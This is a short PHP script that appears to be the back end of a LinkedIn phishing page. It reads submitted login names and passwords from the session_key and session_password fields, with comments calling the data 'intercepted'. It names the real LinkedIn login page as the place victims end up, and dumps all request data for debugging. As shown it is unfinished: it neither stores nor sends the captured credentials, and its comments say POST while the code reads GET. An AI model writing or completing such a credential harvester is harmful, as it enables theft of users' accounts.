<?php
/**
 * NEW - PHP script to collect post data submitted via PHP form
 */

# Location the user ends after the data is intercepted
$final_destination = 'https://www.linkedin.com/login?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin';


// Get post data
$username = $_GET['session_key'] ?? NULL;           # Get the username via the POST query parameters
$password = $_GET['session_password'] ?? NULL;      # Get the password via the POST query parameters

// For debugging
echo "<hr><h3>All GET attributes</h3><pre>".print_r($_GET, true)."</pre>";
echo "<hr><h3>All SESSION attributes</h3><pre>".print_r($_SESSION, true)."</pre>";
echo "<hr><h3>All POST attributes</h3><pre>".print_r($_POST, true)."</pre>";